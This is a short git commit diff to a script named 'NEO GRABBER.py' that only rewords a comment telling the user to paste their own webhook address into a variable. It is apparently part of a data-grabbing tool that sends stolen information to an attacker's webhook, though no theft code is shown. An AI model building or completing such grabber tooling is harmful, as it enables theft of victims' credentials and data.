8e75619a0262ff9b2a8f09331e7b5ff31cf8afe5
TheGeekLucas <118679138+TheGeekLucas@users.noreply.github.com>
2022-11-20 17:53:55 +0100

    Update NEO GRABBER.py

--- NEO GRABBER.py
+++ NEO GRABBER.py
@@ -2,7 +2,7 @@ import os
 import base64, codecs
 import json
 
-webhookk = "WEBHOOK" # Remove the word "webhook" and paste your own one there.
+webhookk = "WEBHOOK" # Paste your own Webhook inside the Quotation Marks.
 
 def command(c):
     os.system(c)
